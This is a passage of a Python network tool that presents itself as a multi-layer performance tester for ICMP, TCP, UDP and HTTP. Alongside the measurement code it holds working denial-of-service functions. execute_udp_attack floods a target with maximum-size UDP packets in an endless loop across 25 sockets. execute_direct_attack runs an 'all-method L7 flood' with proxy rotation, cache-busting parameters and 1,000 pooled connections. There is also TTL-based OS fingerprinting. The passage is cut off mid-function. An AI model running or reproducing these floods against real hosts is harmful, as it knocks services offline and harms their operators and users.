            ping_time = 0
            if success:
                try:
                    # Handle different ping output formats
                    output = result.stdout.lower()
                    if "time=" in output:
                        time_match = re.search(r'time[<=](\d+\.?\d*)ms', output)
                        if time_match:
                            ping_time = float(time_match.group(1)) / 1000
                    elif "time<" in output:
                        ping_time = 0.001  # Less than 1ms
                    elif "время=" in output:  # Russian
                        time_match = re.search(r'время[<=](\d+\.?\d*)мс', output)
                        if time_match:
                            ping_time = float(time_match.group(1)) / 1000
                except:
                    ping_time = end_time - start_time
            
            # Enhanced result data
            test_result = {
                'request_id': request_id,
                'layer': 'Layer 3 (ICMP)',
                'response_time': round(ping_time if ping_time > 0 else end_time - start_time, 3),
                'timestamp': start_time,
                'success': success,
                'details': result.stdout.strip() if success else result.stderr.strip(),
                'packet_size': size_param,
                'ttl': ttl,
                'os': system,
                'target': self.target_host
            }
            
            # Extract additional metrics if available
            if success:
                try:
                    # TTL analysis
                    ttl_match = re.search(r'TTL=(\d+)', result.stdout, re.IGNORECASE)
                    if ttl_match:
                        test_result['received_ttl'] = int(ttl_match.group(1))
                        # OS fingerprinting based on TTL
                        received_ttl = int(ttl_match.group(1))
                        if received_ttl <= 64:
                            test_result['probable_os'] = 'Linux/Unix'
                        elif received_ttl <= 128:
                            test_result['probable_os'] = 'Windows'
                        else:
                            test_result['probable_os'] = 'Other'
                    
                    # Packet loss analysis
                    if "packet loss" in result.stdout.lower():
                        loss_match = re.search(r'(\d+)%\s+packet loss', result.stdout)
                        if loss_match:
                            test_result['packet_loss'] = int(loss_match.group(1))
                    
                    # Bytes analysis
                    bytes_match = re.search(r'bytes=(\d+)', result.stdout, re.IGNORECASE)
                    if bytes_match:
                        test_result['bytes'] = int(bytes_match.group(1))
                except:
                    pass
            
            with self.lock:
                self.results.append(test_result)
                self.request_count += 1
                if self.request_count % 20 == 0:
                    status = "✓" if success else "✗"
                    os_info = f"[{test_result.get('probable_os', 'Unknown')}]" if success else ""
                    print(f"{status} ICMP {self.request_count}: {self.target_host} {os_info} - {test_result['response_time']:.3f}s")
            
            return test_result
            
        except subprocess.TimeoutExpired:
            test_result = {
                'request_id': request_id,
                'layer': 'Layer 3 (ICMP)',
                'error': 'Timeout',
                'timestamp': time.time(),
                'success': False,
                'target': self.target_host
            }
            with self.lock:
                self.results.append(test_result)
            return test_result
        except Exception as e:
            test_result = {
                'request_id': request_id,
                'layer': 'Layer 3 (ICMP)',
                'error': str(e),
                'timestamp': time.time(),
                'success': False,
                'target': self.target_host
            }
            with self.lock:
                self.results.append(test_result)
            return test_result
    
    def layer4_tcp_test(self, request_id):
        """Enhanced Layer 4 - TCP Connection Test with advanced features"""
        try:
            start_time = time.time()
            
            # Create socket with enhanced options
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            # Enhanced socket options
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Set TCP specific options
            if hasattr(socket, 'TCP_NODELAY'):
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            if hasattr(socket, 'TCP_QUICKACK'):
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_QUICKACK, 1)
            
            # Set buffer sizes
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
            
            # Generate enhanced test data
            test_data_templates = [
                # HTTP-like data
                {
                    'type': 'http',
                    'data': f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\nConnection: keep-alive\r\n\r\n"
                },
                # Binary data with magic numbers
                {
                    'type': 'binary',
                    'data': bytes([0x13, 0x37, 0xCA, 0xFE]) + f"TEST_PACKET_{request_id}".encode() + bytes([0xDE, 0xAD, 0xBE, 0xEF])
                },
                # JSON-like data
                {
                    'type': 'json',
                    'data': json.dumps({
                        'request_id': request_id,
                        'timestamp': time.time(),
                        'target': f"{self.target_host}:{self.target_port}",
                        'test_type': 'tcp_connection'
                    })
                },
                # Custom protocol simulation
                {
                    'type': 'custom',
                    'data': struct.pack('!IIHH', 
                        int(time.time()), 
                        request_id,
                        random.randint(1, 65535),
                        random.randint(1, 65535)
                    )
                }
            ]
            
            # Select random test data
            test_packet = random.choice(test_data_templates)
            test_data = test_packet['data'].encode() if isinstance(test_packet['data'], str) else test_packet['data']
            
            # Enhanced connection with timing
            connection_start = time.time()
            result = sock.connect_ex((self.target_host, self.target_port))
            connection_time = time.time() - connection_start
            
            success = result == 0
            response_data = None
            
            if success:
                # Send data
                send_start = time.time()
                sock.send(test_data)
                send_time = time.time() - send_start
                
                # Try to receive response with timeout
                try:
                    receive_start = time.time()
                    response_data = sock.recv(8192)
                    receive_time = time.time() - receive_start
                except socket.timeout:
                    receive_time = None
                    response_data = None
                except:
                    receive_time = None
                    response_data = None
            
            end_time = time.time()
            sock.close()
            
            # Enhanced result data
            test_result = {
                'request_id': request_id,
                'layer': 'Layer 4 (TCP)',
                'response_time': round(end_time - start_time, 3),
                'connection_time': round(connection_time, 3),
                'send_time': round(send_time, 3) if success else None,
                'receive_time': round(receive_time, 3) if receive_time else None,
                'timestamp': start_time,
                'target': f"{self.target_host}:{self.target_port}",
                'data_sent': len(test_data),
                'data_received': len(response_data) if response_data else 0,
                'success': success,
                'test_type': test_packet['type'],
                'details': f"Connection {'established' if success else 'failed'}"
            }
            
            # Extract additional connection info
            if success:
                try:
                    # Get socket info
                    local_addr = sock.getsockname()
                    test_result['local_address'] = f"{local_addr[0]}:{local_addr[1]}"
                    
                    # Get TCP info if available
                    if hasattr(socket, 'TCP_INFO'):
                        tcp_info = sock.getsockopt(socket.IPPROTO_TCP, socket.TCP_INFO, 32)
                        if tcp_info:
                            test_result['tcp_info'] = {
                                'retransmits': tcp_info[0],
                                'rtt': tcp_info[1],
                                'rtt_var': tcp_info[2]
                            }
                except:
                    pass
            
            with self.lock:
                self.results.append(test_result)
                self.request_count += 1
                if self.request_count % 20 == 0:
                    status = "✓" if success else "✗"
                    timing = f"[conn: {test_result['connection_time']:.3f}s]" if success else ""
                    print(f"{status} TCP {self.request_count}: {self.target_host}:{self.target_port} {timing} - {test_result['response_time']:.3f}s")
            
            return test_result
            
        except Exception as e:
            test_result = {
                'request_id': request_id,
                'layer': 'Layer 4 (TCP)',
                'error': str(e),
                'timestamp': time.time(),
                'success': False,
                'target': f"{self.target_host}:{self.target_port}"
            }
            with self.lock:
                self.results.append(test_result)
            return test_result
    
    def layer4_udp_test(self, request_id):
        """Enhanced Layer 4 - UDP Test with advanced features"""
        try:
            start_time = time.time()
            
            # Create enhanced UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)  # Short timeout for speed
            
            # Enhanced socket options
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)  # Max UDP buffer
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65507)  # Max UDP buffer
            
            # Generate enhanced test data with different protocols
            test_data_templates = [
                # DNS-like query
                {
                    'type': 'dns',
                    'data': struct.pack('!HHHHHH', 
                        random.randint(1, 65535),  # Transaction ID
                        0x0100,  # Flags (standard query)
                        0x0001,  # Questions
                        0x0000,  # Answer RRs
                        0x0000,  # Authority RRs
                        0x0000   # Additional RRs
                    ) + b'\x07example\x03com\x00\x00\x01\x00\x01'  # Query for example.com A record
                },
                # SNMP-like query
                {
                    'type': 'snmp',
                    'data': bytes([0x30, 0x26, 0x02, 0x01, 0x00, 0x04, 0x06, 0x70, 0x75, 0x62, 0x6C, 0x69, 0x63, 
                                 0xA0, 0x19, 0x02, 0x01, 0x01, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x30, 0x0E, 
                                 0x30, 0x0C, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00, 0x05, 0x00])
                },
                # NTP-like query
                {
                    'type': 'ntp',
                    'data': bytes([0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
                },
                # Custom binary protocol
                {
                    'type': 'custom',
                    'data': struct.pack('!IIHH16s', 
                        int(time.time()),           # Timestamp
                        request_id,                 # Request ID
                        random.randint(1, 65535),  # Random port
                        random.randint(1, 65535),  # Random flags
                        os.urandom(16)             # Random data
                    )
                },
                # Maximum size packet
                {
                    'type': 'max_size',
                    'data': os.urandom(65507)  # Maximum UDP packet size
                }
            ]
            
            # Select random test data
            test_packet = random.choice(test_data_templates)
            test_data = test_packet['data']
            
            # Send data with timing
            send_start = time.time()
            bytes_sent = sock.sendto(test_data, (self.target_host, self.target_port))
            send_time = time.time() - send_start
            
            response_data = None
            receive_time = None
            
            # Try to receive response
            try:
                receive_start = time.time()
                response_data, addr = sock.recvfrom(65507)
                receive_time = time.time() - receive_start
                success = True
            except socket.timeout:
                success = True  # Consider sent packet as success even without response
                addr = None
            except Exception as e:
                success = False
                addr = None
            
            end_time = time.time()
            sock.close()
            
            # Enhanced result data
            test_result = {
                'request_id': request_id,
                'layer': 'Layer 4 (UDP)',
                'protocol': test_packet['type'],
                'response_time': round(end_time - start_time, 3),
                'send_time': round(send_time, 3),
                'receive_time': round(receive_time, 3) if receive_time else None,
                'timestamp': start_time,
                'target': f"{self.target_host}:{self.target_port}",
                'bytes_sent': bytes_sent,
                'bytes_received': len(response_data) if response_data else 0,
                'remote_addr': f"{addr[0]}:{addr[1]}" if addr else None,
                'success': success
            }
            
            # Protocol-specific response analysis
            if response_data:
                try:
                    if test_packet['type'] == 'dns':
                        # Parse DNS response
                        response_id = struct.unpack('!H', response_data[:2])[0]
                        response_flags = struct.unpack('!H', response_data[2:4])[0]
                        test_result['dns_info'] = {
                            'transaction_id': response_id,
                            'is_response': bool(response_flags & 0x8000),
                            'response_code': response_flags & 0x000F
                        }
                    elif test_packet['type'] == 'snmp':
                        # Basic SNMP response check
                        test_result['snmp_info'] = {
                            'version': response_data[2] if len(response_data) > 2 else None,
                            'community_length': response_data[5] if len(response_data) > 5 else None
                        }
                    elif test_packet['type'] == 'ntp':
                        # Basic NTP response check
                        if len(response_data) >= 48:
                            test_result['ntp_info'] = {
                                'version': (response_data[0] >> 3) & 0x07,
                                'mode': response_data[0] & 0x07
                            }
                except:
                    pass
            
            # Update statistics
            with self.lock:
                self.results.append(test_result)
                self.request_count += 1
                
                # Print status periodically
                if self.request_count % 20 == 0:
                    status = "✓" if success else "✗"
                    protocol = f"[{test_packet['type']}]"
                    timing = f"[{test_result['response_time']:.3f}s]"
                    response_info = f"recv: {test_result['bytes_received']} bytes" if response_data else "no response"
                    print(f"{status} UDP {self.request_count}: {self.target_host}:{self.target_port} {protocol} {timing} - {response_info}")
            
            return test_result
            
        except Exception as e:
            test_result = {
                'request_id': request_id,
                'layer': 'Layer 4 (UDP)',
                'error': str(e),
                'timestamp': time.time(),
                'success': False,
                'target': f"{self.target_host}:{self.target_port}"
            }
            with self.lock:
                self.results.append(test_result)
            return test_result

    def execute_udp_attack(self):
        """Execute UDP flood attack at maximum speed"""
        print("\n🚀 Starting UDP flood...")
        print(f"🎯 Target: {self.target_host}:{self.target_port}")
        
        # Create multiple sockets for faster sending
        sockets = []
        for _ in range(25):  # Use more sockets
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)
            sock.settimeout(0)
            sockets.append(sock)
        
        # Pre-generate different packet sizes
        payloads = [
            b"X" * 256,
            b"X" * 512,
            b"X" * 1024,
            b"X" * 2048,
            b"X" * 4096,
            b"X" * 8192,
            b"X" * 16384,
            b"X" * 32768,
            b"X" * 65507  # Max UDP packet size
        ]
        
        print("\n💣 Starting flood...")
        
        try:
            while True:
                # Rotate through sockets and payloads
                for sock in sockets:
                    for payload in payloads:
                        try:
                            sock.sendto(payload, (self.target_host, self.target_port))
                        except:
                            continue
                            
        except KeyboardInterrupt:
            print("\n🛑 Attack stopped")
        finally:
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass

    def layer7_http_test(self, request_id):
        """Enhanced Layer 7 - HTTP Application Test with advanced features"""
        try:
            start_time = time.time()
            
            # Only proceed if we have compatible methods
            if not self.compatible_methods:
                return {
                    'request_id': request_id,
                    'layer': 'Layer 7 (HTTP)',
                    'error': 'No compatible methods detected',
                    'timestamp': time.time(),
                    'success': False
                }
            
            # Get proxy with session rotation
            current_proxies = self.get_session_id() if self.use_proxy else None
            
            # Create session with enhanced configuration
            session = requests.Session()
            
            # Configure session with optimized settings
            adapter = requests.adapters.HTTPAdapter(
                max_retries=3,
                pool_connections=100 if self.supports_keep_alive else 10,
                pool_maxsize=100 if self.supports_keep_alive else 10,
                pool_block=False
            )
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            
            # Generate enhanced headers
            headers = self.get_request_headers()
            
            # Add advanced headers based on detected features
            if self.supports_compression:
                headers['Accept-Encoding'] = 'gzip, deflate, br'
            if self.supports_keep_alive:
                headers['Connection'] = 'keep-alive'
                headers['Keep-Alive'] = 'timeout=5, max=1000'
            else:
                headers['Connection'] = 'close'
            
            # Enhanced cookie handling
            if self.supports_cookies:
                cookies = self.generate_cookies()
                session.cookies.update(cookies)
            
            # Select method based on effectiveness analysis
            method = self.select_request_method()
            
            # Generate enhanced request pattern
            try:
                path, params = self.generate_request_pattern()
                
                # Add cache busting parameters
                params.update({
                    '_': str(int(time.time() * 1000)),
                    'rid': str(request_id)
                })
                
                # Add realistic query parameters based on path
                if '/search' in path:
                    params.update({
                        'q': f'test_{random.randint(1000,9999)}',
                        'page': str(random.randint(1,10)),
                        'limit': str(random.choice([10,20,50,100]))
                    })
                elif '/api' in path:
                    params.update({
                        'version': 'v1',
                        'format': 'json',
                        'timestamp': str(int(time.time()))
                    })
                elif '/user' in path:
                    params.update({
                        'id': str(random.randint(1000,9999)),
                        'action': random.choice(['view','edit','update'])
                    })
            except Exception as e:
                print(f"Warning: Pattern generation failed: {str(e)}")
                path, params = '/', {'_': str(int(time.time()))}
            
            # Build and validate URL
            try:
                base_url = self.target.rstrip('/')
                url = f"{base_url}{path}"
                
                # Validate URL
                parsed = urlparse(url)
                if not all([parsed.scheme, parsed.netloc]):
                    raise ValueError("Invalid URL structure")
            except Exception as e:
                print(f"Warning: URL generation failed: {str(e)}")
                url = self.target
            
            # Prepare enhanced request configuration
            request_kwargs = {
                'timeout': (3.05, 10),  # (connect, read) timeouts
                'proxies': current_proxies,
                'headers': headers,
                'verify': not self.supports_ssl,
                'allow_redirects': True,
                'params': params
            }
            
            # Add method-specific data
            if method == 'POST' and self.compatible_content_types:
                try:
                    content_type = random.choice(list(self.compatible_content_types))
                    headers['Content-Type'] = content_type
                    
                    if content_type == 'application/json':
                        request_kwargs['json'] = {
                            'request_id': request_id,
                            'timestamp': time.time(),
                            'data': {
                                'test': True,
                                'value': random.randint(1000, 9999)
                            }
                        }
                    elif content_type == 'application/x-www-form-urlencoded':
                        request_kwargs['data'] = {
                            'request_id': request_id,
                            'timestamp': str(int(time.time())),
                            'test': '1'
                        }
                    elif content_type == 'multipart/form-data':
                        request_kwargs['files'] = {
                            'file': ('test.txt', f'Test content {request_id}'),
                            'request_id': (None, str(request_id)),
                            'timestamp': (None, str(int(time.time())))
                        }
                    elif content_type == 'text/plain':
                        request_kwargs['data'] = f'Test request {request_id} at {time.time()}'
                except Exception as e:
                    print(f"Warning: POST data generation failed: {str(e)}")
                    request_kwargs['data'] = {'test': str(int(time.time()))}
            
            # Initialize timing variables
            dns_time = connect_time = ssl_time = send_time = wait_time = receive_time = None
            total_time = None
            response = None
            error_msg = None
            
            try:
                # Send request with detailed timing
                start = time.time()
                
                # DNS lookup timing
                try:
                    dns_start = time.time()
                    socket.gethostbyname(parsed.hostname)
                    dns_time = time.time() - dns_start
                except:
                    dns_time = 0
                
                # Make the request
                response = session.request(method=method, url=url, **request_kwargs)
                
                # Extract timing information
                if hasattr(response, 'elapsed'):
                    total_time = response.elapsed.total_seconds()
                else:
                    total_time = time.time() - start
                
                success = response.status_code < 400
                
            except requests.exceptions.SSLError:
                try:
                    # Retry without SSL if SSL fails
                    request_kwargs['verify'] = False
                    response = session.request(method=method, url=url, **request_kwargs)
                    success = response.status_code < 400
                except Exception as e:
                    error_msg = f"SSL retry failed: {str(e)}"
                    success = False
            except requests.exceptions.RequestException as e:
                if 'EOF occurred in violation of protocol' in str(e):
                    try:
                        # Retry the request once more
                        response = session.request(method=method, url=url, **request_kwargs)
                        success = response.status_code < 400
                    except Exception as retry_e:
                        error_msg = f"EOF retry failed: {str(retry_e)}"
                        success = False
                else:
                    error_msg = str(e)
                    success = False
            except Exception as e:
                error_msg = f"Unexpected error: {str(e)}"
                success = False
            
            end_time = time.time()
            
            # Build enhanced result data
            test_result = {
                'request_id': request_id,
                'layer': 'Layer 7 (HTTP)',
                'method': method,
                'url': url,
                'path': path,
                'params': params,
                'response_time': round(end_time - start_time, 3),
                'dns_time': round(dns_time, 3) if dns_time else None,
                'total_time': round(total_time, 3) if total_time else None,
                'timestamp': start_time,
                'proxy_used': bool(current_proxies),
                'user_agent': headers.get('User-Agent'),
                'content_type': headers.get('Content-Type'),
                'cookies_used': bool(session.cookies),
                'compression_used': self.supports_compression,
                'keep_alive_used': self.supports_keep_alive,
                'ssl_used': self.supports_ssl,
                'success': success
            }
            
            # Add response data if available
            if response:
                test_result.update({
                    'status_code': response.status_code,
                    'reason': response.reason,
                    'headers': dict(response.headers),
                    'content_length': len(response.content),
                    'encoding': response.encoding,
                    'redirect_count': len(response.history),
                    'cookies': dict(response.cookies)
                })
                
                # Parse content type
                content_type = response.headers.get('Content-Type', '').lower()
                if 'json' in content_type:
                    try:
                        test_result['json_response'] = response.json()
                    except:
                        pass
                elif 'xml' in content_type:
                    test_result['content_type_parsed'] = 'xml'
                elif 'html' in content_type:
                    test_result['content_type_parsed'] = 'html'
                
                # Check for security headers
                security_headers = {
                    'Strict-Transport-Security': 'HSTS',
                    'X-Content-Type-Options': 'No Sniff',
                    'X-Frame-Options': 'Frame Options',
                    'X-XSS-Protection': 'XSS Protection',
                    'Content-Security-Policy': 'CSP'
                }
                test_result['security_headers'] = {
                    name: response.headers.get(header)
                    for header, name in security_headers.items()
                    if header in response.headers
                }
            
            if error_msg:
                test_result['error'] = error_msg
            
            # Update method statistics
            self.update_method_stats(method, success, test_result['response_time'])
            
            # Print detailed status
            with self.lock:
                self.results.append(test_result)
                self.request_count += 1
                if self.request_count % 20 == 0:
                    status = "✓" if success else "✗"
                    status_info = f"{response.status_code}" if response else "ERR"
                    timing = f"[{test_result['response_time']:.3f}s]"
                    proxy_info = "proxy" if current_proxies else "direct"
                    effectiveness = self.method_stats[method]['weight'] * 100
                    print(f"{status} HTTP {self.request_count}: {method} {path} {status_info} ({proxy_info}) {timing} - {effectiveness:.1f}% effective")
            
            return test_result
            
        except Exception as e:
            test_result = {
                'request_id': request_id,
                'layer': 'Layer 7 (HTTP)',
                'error': str(e),
                'timestamp': time.time(),
                'success': False,
                'target': self.target
            }
            with self.lock:
                self.results.append(test_result)
            return test_result
    
    def update_monitoring_stats(self, test_result):
        """Update monitoring statistics with test result"""
        current_time = time.time()
        
        with self.lock:
            # Update basic counters
            self.monitoring_stats['total_requests'] += 1
            
            if test_result.get('success', False):
                self.monitoring_stats['successful_requests'] += 1
                
                # Update response time stats
                response_time = test_result.get('response_time', 0)
                self.monitoring_stats['response_times'].append(response_time)
                self.monitoring_stats['min_response_time'] = min(self.monitoring_stats['min_response_time'], response_time)
                self.monitoring_stats['max_response_time'] = max(self.monitoring_stats['max_response_time'], response_time)
                
                # Update status code distribution
                if 'status_code' in test_result:
                    status_code = test_result['status_code']
                    self.monitoring_stats['status_codes'][status_code] = self.monitoring_stats['status_codes'].get(status_code, 0) + 1
                
                # Update data transfer stats
                if 'content_length' in test_result:
                    self.monitoring_stats['bytes_received'] += test_result['content_length']
                if 'data_sent' in test_result:
                    self.monitoring_stats['bytes_sent'] += test_result['data_sent']
            else:
                self.monitoring_stats['failed_requests'] += 1
                error = test_result.get('error', 'Unknown error')
                self.monitoring_stats['errors'][error] = self.monitoring_stats['errors'].get(error, 0) + 1
            
            # Calculate current RPS
            self.interval_requests += 1
            if current_time - self.last_monitor_update >= self.monitor_interval:
                current_rps = self.interval_requests / (current_time - self.last_monitor_update)
                self.monitoring_stats['current_rps'] = current_rps
                self.monitoring_stats['peak_rps'] = max(self.monitoring_stats['peak_rps'], current_rps)
                self.interval_requests = 0
                self.last_monitor_update = current_time
                
                # Print real-time stats
                self.print_realtime_stats()

    def print_realtime_stats(self):
        """Print simplified real-time statistics"""
        current_time = time.time()
        elapsed = current_time - (self.start_time or current_time)
        
        total = self.monitoring_stats['total_requests']
        successful = self.monitoring_stats['successful_requests']
        current_rps = self.monitoring_stats['current_rps']
        
        # Create loading animation
        anim_chars = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        anim_char = anim_chars[int(current_time * 10) % len(anim_chars)]
        
        # Simple progress line
        stats_line = (
            f"\r{anim_char} Requests: {total:,} | "
            f"RPS: {current_rps:.1f} | "
            f"Success: {successful:,} | "
            f"Time: {elapsed:.1f}s"
        )
        
        print(stats_line, end='', flush=True)

    def format_bytes(self, bytes):
        """Format bytes to human readable format"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes < 1024:
                return f"{bytes:.1f} {unit}"
            bytes /= 1024
        return f"{bytes:.1f} TB"

    def print_detailed_stats(self):
        """Print comprehensive statistics"""
        if not self.results:
            print("❌ No results to display")
            return
            
        total_time = time.time() - self.start_time if self.start_time else 0
        successful = [r for r in self.results if r.get('success', False)]
        failed = [r for r in self.results if not r.get('success', False)]
        
        layer_name = {
            'icmp': 'Layer 3 (ICMP)',
            'tcp': 'Layer 4 (TCP)', 
            'udp': 'Layer 4 (UDP)',
            'http': 'Layer 7 (HTTP)'
        }.get(self.target_type, 'Multi-Layer')
        
        print(f"\n\n{'='*70}")  # Extra newline to clear the last real-time stats line
        print(f"🎯 {layer_name.upper()} PERFORMANCE REPORT")
        print(f"{'='*70}")
        print(f"🎯 Target: {self.target}")
        print(f"🕐 Test duration: {total_time:.2f} seconds")
        print(f"📊 Total tests: {len(self.results)}")
        print(f"✅ Successful: {len(successful)} ({len(successful)/len(self.results)*100:.1f}%)")
        print(f"❌ Failed: {len(failed)} ({len(failed)/len(self.results)*100:.1f}%)")
        
        if total_time > 0:
            actual_rps = len(self.results) / total_time
            print(f"⚡ Actual RPS: {actual_rps:.2f}")
            print(f"🎯 Target RPS: {self.requests_per_second}")
        
        if successful:
            response_times = [r['response_time'] for r in successful]
            response_times.sort()
            
            print(f"\n📈 Response Time Statistics:")
            print(f"  📊 Average: {sum(response_times)/len(response_times):.3f}s")
            print(f"  📊 Median: {response_times[len(response_times)//2]:.3f}s")
            print(f"  🟢 Min: {min(response_times):.3f}s")
            print(f"  🔴 Max: {max(response_times):.3f}s")
            if len(response_times) > 20:
                print(f"  📊 95th percentile: {response_times[int(len(response_times)*0.95)]:.3f}s")
                print(f"  📊 99th percentile: {response_times[int(len(response_times)*0.99)]:.3f}s")
        
        # Layer-specific statistics
        if self.target_type == "http":
            status_codes = {}
            for result in successful:
                if 'status_code' in result:
                    code = result['status_code']
                    status_codes[code] = status_codes.get(code, 0) + 1
            
            if status_codes:
                print(f"\n📋 HTTP Status Code Distribution:")
                for code, count in sorted(status_codes.items()):
                    emoji = "✅" if code == 200 else "⚠️" if 300 <= code < 400 else "❌"
                    print(f"  {emoji} {code}: {count} requests ({count/len(successful)*100:.1f}%)")
        
        # Error breakdown
        if failed:
            errors = {}
            for result in failed:
                error = result.get('error', 'Unknown error')
                errors[error] = errors.get(error, 0) + 1
            
            print(f"\n🚨 Error Distribution:")
            for error, count in errors.items():
                print(f"  ❌ {error}: {count} times")
        
        print(f"\n{'='*70}")  # End border

    def execute_test(self, request_id):
        """Execute test with simplified monitoring"""
        result = None
        if self.target_type == "icmp":
            result = self.layer3_icmp_test(request_id)
        elif self.target_type == "tcp":
            result = self.layer4_tcp_test(request_id)
        elif self.target_type == "udp":
            result = self.layer4_udp_test(request_id)
        elif self.target_type == "http":
            result = self.layer7_http_test(request_id)
        else:
            result = self.layer7_http_test(request_id)
        
        self.update_monitoring_stats(result)
        return result
    
    def execute_bulk_test(self, start_id, count):
        """Execute multiple tests in bulk for better performance"""
        results = []
        session = requests.Session()
        session.verify = not self.supports_ssl
        
        # Configure session
        adapter = requests.adapters.HTTPAdapter(
            max_retries=3,
            pool_connections=100,
            pool_maxsize=100
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        # Generate bulk headers and data
        headers = self.get_request_headers()
        if self.supports_cookies:
            session.cookies.update(self.generate_cookies())
            
        method = self.select_request_method()
        proxies = self.get_session_id() if self.use_proxy else None
        
        # Pre-generate request data
        requests_data = []
        for i in range(count):
            request_id = start_id + i
            path, params = self.generate_request_pattern()
            url = f"{self.target.rstrip('/')}{path}"
            
            request_data = {
                'method': method,
                'url': url,
                'headers': headers.copy(),
                'params': params,
                'proxies': proxies,
                'verify': not self.supports_ssl,
                'allow_redirects': True,
                'timeout': 10
            }
            
            if method == 'POST' and self.compatible_content_types:
                content_type = random.choice(list(self.compatible_content_types))
                request_data['headers']['Content-Type'] = content_type
                if content_type == 'multipart/form-data':
                    request_data['files'] = self.generate_post_data(content_type)
                else:
                    request_data['data'] = self.generate_post_data(content_type)
                    
            requests_data.append((request_id, request_data))
        
        # Send requests in bulk
        for request_id, request_data in requests_data:
            try:
                start_time = time.time()
                response = session.request(**request_data)
                end_time = time.time()
                
                success = response.status_code < 400
                result = {
                    'request_id': request_id,
                    'layer': 'Layer 7 (HTTP)',
                    'method': method,
                    'status_code': response.status_code,
                    'response_time': round(end_time - start_time, 3),
                    'content_length': len(response.content),
                    'timestamp': start_time,
                    'success': success
                }
                
            except Exception as e:
                result = {
                    'request_id': request_id,
                    'layer': 'Layer 7 (HTTP)',
                    'error': str(e),
                    'timestamp': time.time(),
                    'success': False
                }
            
            results.append(result)
            with self.lock:
                self.results.append(result)
                self.request_count += 1
                
        return results

    def execute_direct_attack(self):
        """Execute direct attack with all HTTP methods"""
        session = requests.Session()
        session.verify = False  # Disable SSL verification for speed
        
        # Configure session for maximum performance
        adapter = requests.adapters.HTTPAdapter(
            max_retries=0,  # No retries for speed
            pool_connections=1000,
            pool_maxsize=1000
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        # Pre-generate base headers
        base_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
        proxies = self.get_session_id() if self.use_proxy else None
        
        # Pre-generate different request methods and payloads
        request_types = [
            # GET requests
            {
                'method': 'GET',
                'headers': base_headers,
            },
            # POST with JSON
            {
                'method': 'POST',
                'headers': {**base_headers, 'Content-Type': 'application/json'},
                'data': '{"data":"' + ('x' * 1024) + '"}'
            },
            # POST with form data
            {
                'method': 'POST',
                'headers': {**base_headers, 'Content-Type': 'application/x-www-form-urlencoded'},
                'data': 'data=' + ('x' * 1024)
            },
            # POST with text
            {
                'method': 'POST',
                'headers': {**base_headers, 'Content-Type': 'text/plain'},
                'data': 'x' * 1024
            },
            # PUT request
            {
                'method': 'PUT',
                'headers': {**base_headers, 'Content-Type': 'application/json'},
                'data': '{"update":"' + ('x' * 1024) + '"}'
            },
            # DELETE request
            {
                'method': 'DELETE',
                'headers': base_headers
            },
            # HEAD request
            {
                'method': 'HEAD',
                'headers': base_headers
            },
            # OPTIONS request
            {
                'method': 'OPTIONS',
                'headers': base_headers
            },
            # PATCH request
            {
                'method': 'PATCH',
                'headers': {**base_headers, 'Content-Type': 'application/json'},
                'data': '{"patch":"' + ('x' * 1024) + '"}'
            }
        ]
        
        # Additional payload variations
        xml_payload = {
            'method': 'POST',
            'headers': {**base_headers, 'Content-Type': 'application/xml'},
            'data': f'<?xml version="1.0"?><root><data>{"x" * 1024}</data></root>'
        }
        request_types.append(xml_payload)
        
        multipart_payload = {
            'method': 'POST',
            'headers': {**base_headers, 'Content-Type': 'multipart/form-data'},
            'files': {'file': ('test.txt', 'x' * 1024)}
        }
        request_types.append(multipart_payload)
        
        print("\n🚀 Starting all-method L7 flood...")
        print(f"🎯 Target: {self.target}")
        print(f"🌐 Proxy: {'Yes' if proxies else 'No'}")
        print("⚔️ Methods: GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH")
        print("📦 Payloads: JSON, Form, Text, XML, Multipart")
        
        while True:
            try:
                # Rotate through all request types
                for req in request_types:
                    try:
                        # Add random query parameters to bypass caching
                        params = {
                            '_': str(int(time.time() * 1000)),
                            'id': str(random.randint(1, 1000000))
                        }
                        
                        # Send request with minimal error handling for speed
